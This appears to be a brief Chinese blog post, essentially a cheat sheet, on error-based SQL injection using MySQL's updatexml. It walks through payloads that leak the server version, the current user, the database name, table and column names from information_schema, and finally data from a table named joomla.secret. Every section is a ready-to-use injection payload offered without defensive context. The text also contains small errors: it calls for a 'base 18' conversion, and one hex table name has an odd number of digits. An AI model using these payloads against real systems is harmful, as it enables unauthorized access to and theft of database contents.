---
title: '通过updatexml进行sql报错注入'
date: 2020-06-22T22:37:40.000Z
tags: 网络安全
---

#### 1.爆数据库版本信息

```shell
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

#### 2.链接用户

```shell
updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
```

#### 3.链接数据库

```shell
updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
```

#### 4.暴露数据表名称

```shell
updatexml(2,concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)

表名称返回的是16进制，需要转一下。
```

#### 5.暴露数据表的列名称

```shell
updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=66333261685F6D656E755F747970657 limit 0,1)),0)

表名称需要换成18进制。
```

#### 6.查数据

```shell
updatexml(1,concat(0x3e,(select concat(id) from joomla.secret limit 0,1)),0)

根据数据库名称和表名称查询数据库。
```
